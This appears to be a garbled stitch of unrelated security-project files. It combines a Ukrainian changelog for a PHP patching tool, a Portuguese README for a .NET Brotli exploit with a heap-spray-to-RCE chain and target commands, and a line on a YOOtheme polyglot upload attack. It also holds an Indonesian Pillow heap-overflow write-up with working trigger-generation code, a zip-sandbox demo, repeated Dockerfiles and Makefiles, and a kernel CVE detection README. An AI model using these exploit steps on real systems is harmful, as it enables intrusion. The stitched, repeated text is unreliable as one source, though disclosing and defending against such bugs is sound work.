# Changelog

All notable changes to this project are documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Added
- Аудит хоста лише на читання (`run.sh audit`): для кожної гілки PHP-FPM вердикт за версією пакета і його changelog, а не за `php -v`, бо Ubuntu латає без зміни номера версії (#2).
- Звіт з логів (`report.sh`): таблиця на хост, лише з машинних записів `@p2s`, тож звіт показує рівно те, що знайшов запуск (#2).
- Ціль для патча: аудит оцінює збірки, які пропонує apt, і обирає найновішу виправлену того самого походження, тому PPA-версія з вищим номером не замінить виправлену збірку Ubuntu (#3).
- Вік списків пакетів apt у звіті: "ціль none" чесно каже, що виправлення немає лише в закешованих списках, а не взагалі (#3).
- Режим `ensure`: ставить `session.upload_progress.enabled = 0` у FPM і CGI кожної гілки проти CVE-2026-115560, з config test і відкатом, без чіпання чужих файлів і CLI; знаходить перевизначення в пулах, які вмикають upload progress назад (#4).
- Факти про хост в аудиті: який сайт на якому пулі (через `nginx -T`, тож сайти за симлінками теж), чи перезапускався FPM після оновлення, утримані пакети, стан PPA-джерел і їхньої Release info, чи оновлює unattended-upgrades PPA (#5).
- Робота з кількома серверами: `run.sh` бере список хостів і не зупиняється на недосяжному; `report.sh --latest` збирає найновіший лог кожного сервера; `next.sh --latest` каже, що робити далі з кожним сервером, тож перервану сесію можна продовжити (#6).
- Режим `fix`: патч гілок PHP-FPM з піном на ціль аудиту, мітигацією, рестартом лише змінених пулів, порівнянням HTTP-кодів до і після та рядками відкату. Патч іде на сервері в окремому юніті systemd, тому обрив ssh не зупиняє apt, а повторний запуск підхоплює результат і не стартує другий патч (#7).
- apt-хук, який ставить `ensure`: після кожного встановлення пакетів мітигацію буде застосовано знову, тож нова версія PHP теж її отримає; хук ніколи не ламає apt, а аудит показує, чи він на місці (#8).
- Підтримка Apache mod_php: аудит показує mod_php окремим SAPI `apache2` з вердиктом, ціллю і перевіркою, чи перезапускався Apache після оновлення; `ensure` пише `99-security.ini` у `conf.d` для apache2 і ловить у конфігурації Apache директиви `php_admin_flag`/`php_value`, які вмикають upload progress назад, з файлом і рядком (#9).
- Патч для mod_php: перед рестартом apache2 запускає `apachectl configtest`, а якщо тест не пройшов, прибирає новий ini і не чіпає Apache. Гілка, яку обслуговують і FPM, і mod_php, ставиться одним встановленням, а у звіті кожен SAPI має свій рядок. HTTP-проба бере сайти ще й з `apachectl -S`, тож хост лише з Apache більше не виглядає як "сайтів не знайдено" (#9).
- Режим `autoupdate`: PHP з PPA ondrej сам оновлюється через unattended-upgrades, а гілки з Ubuntu чи Debian на PPA не переходять. Спершу кожну таку гілку закріплено пін-файлом `php2shell-php<X.Y>.pref` з `Pin-Priority: -1`, потім `apt-cache policy` перевіряє, що жоден пакет PHP не змінить походження, і лише тоді джерело PPA додано до unattended-upgrades з перевіркою через `unattended-upgrade --dry-run`. Якщо пакет таки змінив би походження, запуск зупиняється, називає гілку й пін, який не спрацював (зокрема пін з іменем, яке apt ігнорує, як-от `.conf`), і не додає джерело. Наявні еквівалентні пін чи джерело розпізнаються за вмістом під будь-яким іменем і вдруге не пишуться; хост без PPA лишається недоторканим. `next.sh` і звіт показують цей крок (#10).
- CI на кожен push і PR: shellcheck 0.11.0 (версію зафіксовано з контрольною сумою), перевірка синтаксису бандла кожного режиму і тести. Попередження shellcheck прибрано без зміни поведінки: бібліотеки отримали `# shellcheck shell=bash`, навмисні місця позначено директивами з причиною (#34).
- Скіл `php2shell`, маніфести плагіна і маркетплейсу, тести на заглушках з фейковими коренями та перевіркою мутаціями.
- `autoupdate` у README і скілі тепер прямо каже, на що погоджується оператор: окремого розділу безпеки в PPA ondrej немає, тож unattended-upgrades ставитиме кожну нову збірку PHP з PPA (і бібліотеки, які PPA постачає разом з нею) за своїм розкладом, з рестартом PHP-FPM. Скіл запускає цей режим лише на хостах, які оператор назвав після цього попередження (#10).
- Аудит розрізняє "фіксу немає в закешованих списках" і "фіксу для цього релізу не існує": `no-fix-for-release` для Debian 11 і `fix-only-in-esm` для Ubuntu 20.04 і старших без Ubuntu Pro ESM. Звіт пише під таблицею, що допоможе замість `apt-get update`, а `next.sh` дає новий крок `manual` і більше не шле такий хост на повторний `fix`. Додано пороги ESM-збірок 20.04 і 18.04 з USN-8948-2 (#26).

﻿# DotNet-HTTP2Shell / CVE-2026-111497

**By Gh0st-Bx1 | [github.com/Ghost-Bx1](https://github.com/Ghost-Bx1)**

---

Brotli OOB Write em .NET BrotliDecoder / BrotliStream (`System.IO.Compression`). O decompressor escreve além do buffer de saída quando `MLEN` excede a capacidade do `Span<byte>` fornecido pelo chamador, sem verificação de bounds.

Também conhecido como: **HTTP2Shell** / **Broccoli2Shell** / **Node2Shell**

## Versões afetadas

| Runtime | Versão vulnerável | Patch |
|---------|-------------------|-------|
| .NET 8  | 8.0.0 – 8.0.32   | 8.0.33 |
| .NET 9  | 9.0.0 – 9.0.21   | 9.0.22 |
| .NET 10 | 10.0.0 – 10.0.13 | 10.0.14 |
| .NET 11 | RC3 e anteriores | RC4+ |

## Arquivos

| Arquivo | Descrição |
|---------|-----------|
| `poc.py` | Prova de conceito - fingerprint de versão, crash probe e fuzzing dos 3 variantes de payload |
| `exploit.py` | Exploit completo - heap spray → OOB write → JIT overwrite → RCE / reverse shell |

```bash
# Verificar versao do .NET no alvo
python poc.py -u https://target.com --check-version

# Probe com variante 1 (MLEN overflow)
python poc.py -u https://target.com --probe --variant 1

# Fuzz com todos os 3 variantes
python poc.py -u https://target.com --fuzz

python poc.py -u https://target.com --scan
```

| Opcao | Descricao |
|-------|-----------|
| `-u URL` | URL alvo |
| `--path PATH` | Endpoint HTTP (padrao: `/`) |
| `--timeout N` | Timeout em segundos (padrao: 15) |
| `--proxy URL` | Proxy HTTP/HTTPS |
| `--verbose` | Saida detalhada |
| `--spray N` | Quantidade de requests de heap spray (padrao: 64) |
| `--platform` | `linux` ou `windows` (padrao: linux) |

## Cadeia de exploracao

```
1. Heap spray       → preenche slots do ArrayPool<byte> com dados controlados
2. OOB write        → MLEN > buffer → escrita alem do limite
3. Type confusion   → sobrescreve MethodTable do objeto adjacente
4. Arbitrary write  → fake byte[] com length=0x7FFFFFFF
5. JIT overwrite    → sobrescreve codigo JIT compilado com shellcode
6. RCE              → execucao de codigo arbitrario
```

## Variantes de payload

| Variante | Tecnica | Efeito |
|----------|---------|--------|
| v1 | MLEN=0xFFFFFF (16MB declarado), 32 bytes reais | OOB write classico |
| v2 | BrotliDecoder.TryDecompress stack buffer overflow | Stack smash |
| v3 | Backward-reference distance=0xFFFFFFFF | OOB read/write |

Every page on a YOOtheme site publishes signed image URLs — the attacker grabs any one of them, adds `FROMFILE` (fetch a JPEG/PHP polyglot from an attacker-controlled server) and `SAVE` (traverse out of the cache directory into a publicly executable path), and the handler writes the polyglot to disk as a `.php` file. # CVE-2026-96778 — Heap Buffer Overflow in Pillow JPEG Encoder

![Status](https://img.shields.io/badge/status-verified-red)
![Pillow](https://img.shields.io/badge/Pillow-9.4.0%20%E2%80%93%20%3C13.0.0-red)
![Fixed](https://img.shields.io/badge/fixed-13.0.0-green)
![Platform](https://img.shields.io/badge/platform-linux%20x86__64-lightgrey)

Repositori ini berisi **Proof of Concept (PoC)**, bukti reproduksi, dan analisis
teknis untuk **CVE-2026-96778**, sebuah *heap buffer overflow* pada pustaka
[Pillow](https://python-pillow.org/) (Python Imaging Library).

> **Ringkasan singkat**: Menyimpan ulang gambar JPEG yang membawa profil ICC
> berukuran tepat dan komentar (COM marker) menyebabkan penulisan melewati
> buffer encoder 65.536 byte, merusak metadata heap, dan berpotensi
> menyebabkan *denial of service* (crash) hingga eksekusi kode.

---

## 1. Detail Kerentanan

| Field | Nilai |
|---|---|
| **CVE ID** | CVE-2026-96778 |
| **Komponen** | `src/libImaging/JpegEncode.c` — `ImagingJpegEncode()` |
| **Titik rentan** | Baris 282 (`jpeg_write_marker` untuk COM marker) |
| **Tipe** | Heap Buffer Overflow (CWE-122) |
| **Rentang terpengaruh** | Pillow **9.4.0 – <13.0.0** |
| **Diperbaiki di** | Pillow **13.0.0** |
| **Dampak** | DoS (SIGSEGV/SIGABRT), potensi RCE |
| **Vektor** | Lokal / interaksi pengguna (membuka & menyimpan ulang gambar) |
| **Advisory** | [GHSA-g7cr-3p24-7wf7](https://github.com/python-pillow/Pillow/security/advisories/GHSA-g7cr-3p24-7wf7) |

---

## 2. Analisis Akar Masalah

### 2.1 Alur Kode

1. `JpegImagePlugin._save()` menghitung ukuran buffer output hanya dari
   `exif` dan `extra` (profil ICC), **tanpa menyisakan ruang untuk komentar**.
2. `_encode_to_file()` (`src/encode.c:186`) mengalokasikan buffer
   `MAXBLOCK = 65.536` byte.
3. Profil ICC sebesar **65.498 byte** mengisi buffer tepat hingga byte terakhir,
   sehingga `free_in_buffer == 0`.
4. Saat `jpeg_write_marker()` dipanggil untuk menulis COM marker
   (`JpegEncode.c:282`), `libjpeg` **menulis 1 byte terlebih dahulu**, baru
   kemudian mengurangi counter `size_t free_in_buffer`.
5. Karena counter bernilai 0, pengurangan menyebabkan **underflow** menjadi
   ~2⁶⁴. Pemeriksaan batas selanjutnya menjadi tidak valid.
6. Sisa komentar dan data gambar terkompresi **ditulis melewati batas buffer**,
   menimpa memori heap di sekitarnya.

### 2.2 Perhitungan Ukuran Pemicu

```
ENCODER_BUFFER = 65536          # ImageFile.MAXBLOCK
JFIF_HEADER    = 20             # SOI + APP0 (ditulis jpeg_start_compress)
ICC_OVERHEAD   = 18             # FFE2 <len> "ICC_PROFILE\0" <seq> <count>
ICC_PAYLOAD    = 65536 - 20 - 18 = 65498   # tepat penuh
```

Dengan `ICC_PAYLOAD = 65498`, buffer terisi tepat sampai byte terakhir.
Menambahkan COM marker (panjang berapa pun, 1–65533 byte) memicu overflow.

### 2.3 Mengapa Komentar Besar Lebih Efektif

Komentar maksimal legal (`65.533` byte) membuat overflow menulis data dalam
jumlah besar, sehingga crash lebih deterministik. Komentar kecil (mis. 32 byte)
tetap memicu `Invalid write` di Valgrind, tetapi belum tentu crash di runtime
normal (tergantung layout heap dan allocator).

## 4. Proof of Concept
### 4.1 `make_trigger.py` — Generator JPEG Pemicu

Membuat `trigger.jpg` dengan profil ICC 65.498 byte dan COM marker.

```python
from PIL import Image
import io, struct

im = Image.new("RGB", (16, 16), (255, 0, 0))
buf = io.BytesIO()
im.save(buf, "JPEG", quality=90)
base_jpeg = buf.getvalue()

icc_data = b"\x00" * 65498
icc_header = b"ICC_PROFILE\x00" + bytes([1, 1])
app2_payload = icc_header + icc_data

def make_app2(payload):
    length = len(payload) + 2
    return b"\xFF\xE2" + struct.pack(">H", length) + payload

def make_com(comment: bytes):
    length = len(comment) + 2
    return b"\xFF\xFE" + struct.pack(">H", length) + comment

assert base_jpeg[:2] == b"\xFF\xD8"
trigger = base_jpeg[:2] + make_app2(app2_payload) + make_com(b"X" * 32) + base_jpeg[2:]

with open("trigger.jpg", "wb") as f:
    f.write(trigger)
print("trigger.jpg dibuat:", len(trigger), "byte")
```

### 4.2 `repro_cve.py` — Reproduksi Valgrind-Friendly

```python
from PIL import Image

im = Image.open("trigger.jpg")
print("Ukuran:", im.size, "format:", im.format)
print("Punya ICC:", "icc_profile" in im.info)
print("Punya komentar:", "comment" in im.info)

im.save("out.jpg", "JPEG", icc_profile=im.info.get("icc_profile"))
print("Selesai menyimpan ulang.")
```

valgrind --error-exitcode=1 python3 repro_cve.py 2> valgrind.log
```

# Stopping Remote Code Execution with a Sandbox: a live zip-crate RCE demo

**Read the full story on the Cosmonic blog:** [Stopping Remote Code Execution with a Sandbox](https://cosmonic.com/blog/stopping-remote-code-execution-with-a-sandbox/)

![A malicious zip tries to plant a root program or overwrite a file another service trusts; two Cosmonic sandboxes with scoped grants block every move.](docs/images/zip-sandbox-rce-hero.png)

The Rust `zip` crate shipped two serious vulnerabilities nine days apart, one of them a CVSS 10.0.
This repo runs that exact vulnerable code, unpatched, inside a deny-by-default
[Cosmonic](https://cosmonic.com/) sandbox, and lets you fire real crafted archives at it. Every
attack runs. None of them can do anything.

**Step by step:** [Sandboxed zip extractor](https://cosmonic.com/docs/desktop/examples/sandboxed-zip-extractor) (the docs walkthrough)

> **You can't execute what you don't have.** A sandbox doesn't have to recognize the attack. It
> starts with nothing and hands the code only the capabilities you grant: here, one scratch folder
> and no network. See [principles of secure agent platforms](https://cosmonic.com/ai-sandbox/principles/).

## The four attack scenarios

The demo page has one red button per scenario. Each streams a real crafted archive into the sandbox;
nothing is patched.

| Button | Vulnerability | What the crafted archive does | In the sandbox |
|---|---|---|---|
| **Bug 1: setuid bits** | [RUSTSEC-2026-0367](https://rustsec.org/advisories/RUSTSEC-2026-0367.html) · setuid · CVSS 7.3 | Three entries carry setuid, setgid and sticky bits. On a Unix extractor they'd hand a dropped file root-level powers. | All three bits reach the report; zero are applied. |
| **Bug 2: zip slip** | CWE-22 · path traversal · CVSS 8.1 | Entry names use `../` to write outside the extraction folder, aiming at `/tmp` and `/etc/cron.d`. | All three paths are refused. |
| **Bug 3: zip cloaking** | [CVE-2026-115905](https://www.cve.org/CVERecord?id=CVE-2026-115905) · zip cloaking · CVSS 10.0 | The central directory shows a scanner `release-notes.txt`; the local header tells a streaming extractor to write `home/you/.ssh/authorized_keys`. | The cloaked write is honored but lands inside `/tmp/unzip`, a throwaway folder. |
| **Run all attacks** | all three at once | One archive carrying every attack above. | All of the above, contained together. |

Other IDs, if you're searching for them: RUSTSEC-2026-0367 is GHSA-vv5m-jxxh-4627 (CWE-732), and
CVE-2026-115905 is GHSA-m665-v7pm-7grj (CWE-436).

Both advisories affect `zip` 8.6.0, the version used here on purpose. **In your own code, upgrade to
`zip` 9.0.5**, which fixes both.

## Quickstart

1. **Install [Cosmonic Desktop](https://cosmonic.com/desktop/).** It runs WebAssembly components as
   sandboxed workloads on macOS, Windows and Linux, and listens on `127.0.0.1:8200`.
2. **Apply the manifest.** [`deploy/zip-sandbox.workload.yaml`](deploy/zip-sandbox.workload.yaml)
   pins both components by digest on ghcr, so there's nothing to build. The easiest route is an AI
   assistant connected to Desktop's MCP server
   ([Connect coding agents](https://cosmonic.com/docs/desktop/coding-agents/)):

   > "Apply `deploy/zip-sandbox.workload.yaml` to Cosmonic Desktop, then show me its status."

   Or copy the manifest to `workloads/default/zip-sandbox.yaml` under Desktop's state directory
   (`cosmonicd paths` prints it).
3. **Open <http://zip-sandbox.localhost:8200/>** and press the red buttons, one per
   [scenario](#the-four-attack-scenarios), or upload your own zip.

> **One gotcha.** The extractor needs its `/tmp/unzip` volume. Desktop's quick-deploy paths
> (`cosmonic dev`, publish drafts, pasting an image link) build a spec from the image alone and drop
> the `volumes` section, and the extractor then answers `"sandbox unavailable"`. Apply the manifest
> as written.

### From the command line

Each scenario has an API mode and a downloadable archive, so you can inspect the raw bytes:

| Scenario | Run it | Download the archive |
|---|---|---|
| Bug 1: setuid bits | `/run?mode=suid` (the default) | `/suid.zip` |
| Bug 2: zip slip | `/run?mode=slip` | `/slip.zip` |
| Bug 3: zip cloaking | `/run?mode=cloak` | `/cloak.zip` |
| Run all attacks | `/run?mode=all` | `/all.zip` |

```bash
B=http://127.0.0.1:8200
curl -s -H 'Host: zip-sandbox.localhost' "$B/run?mode=all" | python3 -m json.tool

# or upload your own zip
curl -s -H 'Host: zip-sandbox.localhost' -H 'content-type: application/zip' \
     --data-binary @your.zip "$B/run" | python3 -m json.tool
```

A contained run of `mode=all` reports:

```
MITIGATED: 3 privileged (setuid/setgid/sticky) entries in the archive, 0 applied;
3 zip-slip paths refused; 1 cloaked entry (CVE-2026-115905) honored but confined.
Everything stayed inside /tmp/unzip.
```

# syntax=docker/dockerfile:1.7
#
# Profile layers on top of a "core" PHP image built from core/<branch>/<os>/<variant>/
# (vendored docker-library/php Dockerfiles with the patched PHP_VERSION, or the
# hand-maintained core/*-backport/ ones).
#
#   docker build -t local/php-core:8.5-fpm core/8.5/trixie/fpm
#   docker build --build-arg BASE_IMAGE=local/php-core:8.5-fpm --target app -t my/php:8.5-fpm-app .
#
# Targets: base | web | app | dev

ARG BASE_IMAGE=php-core
ARG COMPOSER_IMAGE=composer:2.10.3@sha256:af98f42dfff7c68ba8d53c2164fd9fde1087b7d449514baa38c418b1f6bc4bac

FROM ${COMPOSER_IMAGE} AS composer

# ---------------------------------------------------------------- base
FROM ${BASE_IMAGE} AS base

# Pull current OS security updates (Debian or Alpine) on every (weekly) rebuild.
RUN set -eux; \
    if command -v apk >/dev/null; then \
      apk upgrade --no-cache; \
    else \
      apt-get update; \
      apt-get -y upgrade; \
      rm -rf /var/lib/apt/lists/*; \
    fi

# mlocati/docker-php-extension-installer, pinned release + checksum
ADD --chmod=0755 \
    --checksum=sha256:9c26dd516b8147235c4e924c52e2f076fb2b3f278f5457e88918518ebfee9e01 \
    https://github.com/mlocati/docker-php-extension-installer/releases/download/2.12.3/install-php-extensions \
    /usr/local/bin/install-php-extensions

# pecl.php.net is flaky under load: retry the whole install a few times
RUN set -eux; \
    printf '%s\n' '#!/bin/sh' \
      'for i in 1 2 3 4; do install-php-extensions "$@" && exit 0; echo "retry $i" >&2; sleep $((i * 15)); done' \
      'exit 1' > /usr/local/bin/ipe-retry; \
    chmod 0755 /usr/local/bin/ipe-retry

# profile extension installer (memcached build deps, PHP 7.4 specifics)
COPY --chmod=0755 profile/ipe-profile /usr/local/bin/ipe-profile

# opcache is built into PHP 8.5; on 8.2-8.4 it is a shared ext that must be enabled
RUN set -eux; \
    if ! php -m | grep -qi '^Zend OPcache$'; then docker-php-ext-enable opcache; fi; \
    cp "$PHP_INI_DIR/php.ini-production" "$PHP_INI_DIR/php.ini"; \
    { \
      echo 'expose_php = Off'; \
      echo 'opcache.enable = 1'; \
      echo 'opcache.enable_cli = 0'; \
      echo '; php.net advisory 2026-10-23-1 (CVE-2026-115560): off by default,'; \
      echo '; override in your own conf.d if you need session upload progress.'; \
      echo 'session.upload_progress.enabled = 0'; \
    } > "$PHP_INI_DIR/conf.d/zz-patched-images.ini"; \
    php -v

LABEL org.opencontainers.image.source="https://github.com/stufently/php-patched-images" \
      org.opencontainers.image.description="PHP built from source with fixes for CVE-2026-109618 / CVE-2026-109619 (7.4/8.1: best-effort backport builds)" \
      org.opencontainers.image.licenses="MIT"

# ---------------------------------------------------------------- web
# WordPress / OpenCart / Joomla / Drupal / classic CMS
FROM base AS web
RUN set -eux; \
    ipe-profile \
      bcmath exif gd intl ldap mysqli pdo_mysql soap zip \
      imagick-3.8.1 memcached-3.4.0; \
    php -m

# ---------------------------------------------------------------- app
# Laravel / Symfony / generic framework apps, queue workers (cli)
FROM base AS app
RUN set -eux; \
    ipe-profile \
      bcmath exif gd intl ldap pcntl pdo_mysql pdo_pgsql pgsql soap sockets zip \
      redis-6.3.0 apcu-5.1.28 memcached-3.4.0; \
    php -m
COPY --from=composer /usr/bin/composer /usr/local/bin/composer

# ---------------------------------------------------------------- dev
# app + Xdebug + development php.ini. NOT for production.
# Xdebug 3.2+ needs PHP 8.0+: the 7.4 backport gets 3.1.6, the last release
# for PHP 7.2-8.1 (see README).
FROM app AS dev
RUN set -eux; \
    case "$PHP_VERSION" in \
      7.4.*) xdebug=xdebug-3.1.6 ;; \
      *)     xdebug=xdebug-3.5.3 ;; \
    esac; \
    ipe-profile "$xdebug"; \
    cp "$PHP_INI_DIR/php.ini-development" "$PHP_INI_DIR/php.ini"; \
    { \
      echo 'xdebug.mode = develop,debug'; \
      echo 'xdebug.client_host = host.docker.internal'; \
      echo 'xdebug.start_with_request = trigger'; \
    } > "$PHP_INI_DIR/conf.d/zz-xdebug.ini"; \
    php -m

# syntax=docker/dockerfile:1.7
#
# Profile layers on top of a "core" PHP image built from core/<branch>/<os>/<variant>/
# (vendored docker-library/php Dockerfiles with the patched PHP_VERSION, or the
# hand-maintained core/*-backport/ ones).
#
#   docker build -t local/php-core:8.5-fpm core/8.5/trixie/fpm
#   docker build --build-arg BASE_IMAGE=local/php-core:8.5-fpm --target app -t my/php:8.5-fpm-app .
#
# Targets: base | web | app | dev

ARG BASE_IMAGE=php-core
ARG COMPOSER_IMAGE=composer:2.10.3@sha256:af98f42dfff7c68ba8d53c2164fd9fde1087b7d449514baa38c418b1f6bc4bac

FROM ${COMPOSER_IMAGE} AS composer

# ---------------------------------------------------------------- base
FROM ${BASE_IMAGE} AS base

# Pull current OS security updates (Debian or Alpine) on every (weekly) rebuild.
RUN set -eux; \
    if command -v apk >/dev/null; then \
      apk upgrade --no-cache; \
    else \
      apt-get update; \
      apt-get -y upgrade; \
      rm -rf /var/lib/apt/lists/*; \
    fi

# mlocati/docker-php-extension-installer, pinned release + checksum
ADD --chmod=0755 \
    --checksum=sha256:9c26dd516b8147235c4e924c52e2f076fb2b3f278f5457e88918518ebfee9e01 \
    https://github.com/mlocati/docker-php-extension-installer/releases/download/2.12.3/install-php-extensions \
    /usr/local/bin/install-php-extensions

# pecl.php.net is flaky under load: retry the whole install a few times
RUN set -eux; \
    printf '%s\n' '#!/bin/sh' \
      'for i in 1 2 3 4; do install-php-extensions "$@" && exit 0; echo "retry $i" >&2; sleep $((i * 15)); done' \
      'exit 1' > /usr/local/bin/ipe-retry; \
    chmod 0755 /usr/local/bin/ipe-retry

# profile extension installer (memcached build deps, PHP 7.4 specifics)
COPY --chmod=0755 profile/ipe-profile /usr/local/bin/ipe-profile

# opcache is built into PHP 8.5; on 8.2-8.4 it is a shared ext that must be enabled
RUN set -eux; \
    if ! php -m | grep -qi '^Zend OPcache$'; then docker-php-ext-enable opcache; fi; \
    cp "$PHP_INI_DIR/php.ini-production" "$PHP_INI_DIR/php.ini"; \
    { \
      echo 'expose_php = Off'; \
      echo 'opcache.enable = 1'; \
      echo 'opcache.enable_cli = 0'; \
      echo '; php.net advisory 2026-10-23-1 (CVE-2026-115560): off by default,'; \
      echo '; override in your own conf.d if you need session upload progress.'; \
      echo 'session.upload_progress.enabled = 0'; \
    } > "$PHP_INI_DIR/conf.d/zz-patched-images.ini"; \
    php -v

LABEL org.opencontainers.image.source="https://github.com/stufently/php-patched-images" \
      org.opencontainers.image.description="PHP built from source with fixes for CVE-2026-109618 / CVE-2026-109619 (7.4/8.1: best-effort backport builds)" \
      org.opencontainers.image.licenses="MIT"

# ---------------------------------------------------------------- web
# WordPress / OpenCart / Joomla / Drupal / classic CMS
FROM base AS web
RUN set -eux; \
    ipe-profile \
      bcmath exif gd intl ldap mysqli pdo_mysql soap zip \
      imagick-3.8.1 memcached-3.4.0; \
    php -m

# ---------------------------------------------------------------- app
# Laravel / Symfony / generic framework apps, queue workers (cli)
FROM base AS app
RUN set -eux; \
    ipe-profile \
      bcmath exif gd intl ldap pcntl pdo_mysql pdo_pgsql pgsql soap sockets zip \
      redis-6.3.0 apcu-5.1.28 memcached-3.4.0; \
    php -m
COPY --from=composer /usr/bin/composer /usr/local/bin/composer

# ---------------------------------------------------------------- dev
# app + Xdebug + development php.ini. NOT for production.
# Xdebug 3.2+ needs PHP 8.0+: the 7.4 backport gets 3.1.6, the last release
# for PHP 7.2-8.1 (see README).
FROM app AS dev
RUN set -eux; \
    case "$PHP_VERSION" in \
      7.4.*) xdebug=xdebug-3.1.6 ;; \
      *)     xdebug=xdebug-3.5.3 ;; \
    esac; \
    ipe-profile "$xdebug"; \
    cp "$PHP_INI_DIR/php.ini-development" "$PHP_INI_DIR/php.ini"; \
    { \
      echo 'xdebug.mode = develop,debug'; \
      echo 'xdebug.client_host = host.docker.internal'; \
      echo 'xdebug.start_with_request = trigger'; \
    } > "$PHP_INI_DIR/conf.d/zz-xdebug.ini"; \
    php -m

---
BINARY := weblogic-cve-scanner
VERSION ?= $(shell git describe --tags --always --dirty 2>/dev/null || echo "dev")
LDFLAGS := -s -w -X main.version=$(VERSION)

DIST := dist

# 支持的平台: GOOS/GOARCH
TARGETS := \
	darwin-amd64 \
	darwin-arm64 \
	windows-386 \
	windows-amd64 \
	windows-arm64

.PHONY: all clean release $(TARGETS)

all: $(TARGETS)

$(DIST):
	mkdir -p $(DIST)

# 通用跨编译规则
$(TARGETS): | $(DIST)
	@GOOS=$(word 1,$(subst -, ,$@)) \
	GOARCH=$(word 2,$(subst -, ,$@)) \
	go build -ldflags "$(LDFLAGS)" \
		-o $(DIST)/$(BINARY)-$(VERSION)-$@$(if $(findstring windows,$@),.exe,) \
		.
	@echo "✓ built: $(DIST)/$(BINARY)-$(VERSION)-$@"

# 打包压缩 (tar.gz / zip)
release: all
	@cd $(DIST) && \
	for f in $(BINARY)-$(VERSION)-*; do \
		case $$f in \
			*.exe) zip -q $$f.zip $$f && rm $$f ;; \
			*) tar czf $$f.tar.gz $$f && rm $$f ;; \
		esac; \
	done
	@echo "" && echo "=== Release artifacts ===" && ls -lh $(DIST)/

clean:
	rm -rf $(DIST)

---
BINARY := weblogic-cve-scanner
VERSION ?= $(shell git describe --tags --always --dirty 2>/dev/null || echo "dev")
LDFLAGS := -s -w -X main.version=$(VERSION)

DIST := dist

# 支持的平台: GOOS/GOARCH
TARGETS := \
	darwin-amd64 \
	darwin-arm64 \
	windows-386 \
	windows-amd64 \
	windows-arm64

.PHONY: all clean release $(TARGETS)

all: $(TARGETS)

$(DIST):
	mkdir -p $(DIST)

# 通用跨编译规则
$(TARGETS): | $(DIST)
	@GOOS=$(word 1,$(subst -, ,$@)) \
	GOARCH=$(word 2,$(subst -, ,$@)) \
	go build -ldflags "$(LDFLAGS)" \
		-o $(DIST)/$(BINARY)-$(VERSION)-$@$(if $(findstring windows,$@),.exe,) \
		.
	@echo "✓ built: $(DIST)/$(BINARY)-$(VERSION)-$@"

# 打包压缩 (tar.gz / zip)
release: all
	@cd $(DIST) && \
	for f in $(BINARY)-$(VERSION)-*; do \
		case $$f in \
			*.exe) zip -q $$f.zip $$f && rm $$f ;; \
			*) tar czf $$f.tar.gz $$f && rm $$f ;; \
		esac; \
	done
	@echo "" && echo "=== Release artifacts ===" && ls -lh $(DIST)/

clean:
	rm -rf $(DIST)


---

BINARY := weblogic-cve-scanner

	go build -ldflags "$(LDFLAGS)" \
		-o $(DIST)/$(BINARY)-$(VERSION)-$@$(if $(findstring windows,$@),.exe,) \
		.
	@echo "✓ built: $(DIST)/$(BINARY)-$(VERSION)-$@"

release: all
	@cd $(DIST) && \
	for f in $(BINARY)-$(VERSION)-*; do \
		case $$f in \
			*.exe) zip -q $$f.zip $$f && rm $$f ;; \
			*) tar czf $$f.tar.gz $$f && rm $$f ;; \
		esac; \
	done
	@echo "" && echo "=== Release artifacts ===" && ls -lh $(DIST)/

clean:
	rm -rf $(DIST)

---
BINARY := weblogic-cve-scanner
VERSION ?= $(shell git describe --tags --always --dirty 2>/dev/null || echo "dev")
LDFLAGS := -s -w -X main.version=$(VERSION)

DIST := dist

# 支持的平台: GOOS/GOARCH
TARGETS := \
	darwin-amd64 \
	darwin-arm64 \
	windows-386 \
	windows-amd64 \
	windows-arm64

.PHONY: all clean release $(TARGETS)

all: $(TARGETS)

$(DIST):
	mkdir -p $(DIST)

# 通用跨编译规则
$(TARGETS): | $(DIST)
	@GOOS=$(word 1,$(subst -, ,$@)) \
	GOARCH=$(word 2,$(subst -, ,$@)) \
	go build -ldflags "$(LDFLAGS)" \
		-o $(DIST)/$(BINARY)-$(VERSION)-$@$(if $(findstring windows,$@),.exe,) \
		.
	@echo "✓ built: $(DIST)/$(BINARY)-$(VERSION)-$@"

# 打包压缩 (tar.gz / zip)
release: all
	@cd $(DIST) && \
	for f in $(BINARY)-$(VERSION)-*; do \
		case $$f in \
			*.exe) zip -q $$f.zip $$f && rm $$f ;; \
			*) tar czf $$f.tar.gz $$f && rm $$f ;; \
		esac; \
	done
	@echo "" && echo "=== Release artifacts ===" && ls -lh $(DIST)/

clean:
	rm -rf $(DIST)


---

---
BINARY := weblogic-cve-scanner
VERSION ?= $(shell git describe --tags --always --dirty 2>/dev/null || echo "dev")
LDFLAGS := -s -w -X main.version=$(VERSION)

DIST := dist

# 支持的平台: GOOS/GOARCH
TARGETS := \
	darwin-amd64 \
	darwin-arm64 \
	windows-386 \
	windows-amd64 \
	windows-arm64

.PHONY: all clean release $(TARGETS)

all: $(TARGETS)

$(DIST):
	mkdir -p $(DIST)

# 通用跨编译规则
$(TARGETS): | $(DIST)
	@GOOS=$(word 1,$(subst -, ,$@)) \
	GOARCH=$(word 2,$(subst -, ,$@)) \
	go build -ldflags "$(LDFLAGS)" \
		-o $(DIST)/$(BINARY)-$(VERSION)-$@$(if $(findstring windows,$@),.exe,) \
		.
	@echo "✓ built: $(DIST)/$(BINARY)-$(VERSION)-$@"

# 打包压缩 (tar.gz / zip)
release: all
	@cd $(DIST) && \
	for f in $(BINARY)-$(VERSION)-*; do \
		case $$f in \
			*.exe) zip -q $$f.zip $$f && rm $$f ;; \
			*) tar czf $$f.tar.gz $$f && rm $$f ;; \
		esac; \
	done
	@echo "" && echo "=== Release artifacts ===" && ls -lh $(DIST)/

clean:
	rm -rf $(DIST)

# CVE-2026-98432 Detection Toolkit

Tools for detecting exposure to **CVE-2026-98432** — a Linux kernel IPv4 TCP use-after-free (CVSS 9.8) affecting kernels 4.4 through pre-fix stable branches.

## Tools

| File | Purpose | Requires |
|------|---------|----------|
| `check-cve-2026-98432.sh` | Local kernel version check — confirms patched/vulnerable | Shell access (SSH/console) |
| `probe-mptcp.py` | Remote MPTCP capability probe — detects the demonstrated exploit vector | Python 3.9+, Linux kernel ≥ 5.6 on the probing host |
| `scan-and-probe.sh` | Chains nmap port discovery into the MPTCP probe | nmap + above |

## Quick start

### Local check (run on each server)

```sh
chmod +x check-cve-2026-98432.sh
./check-cve-2026-98432.sh
```

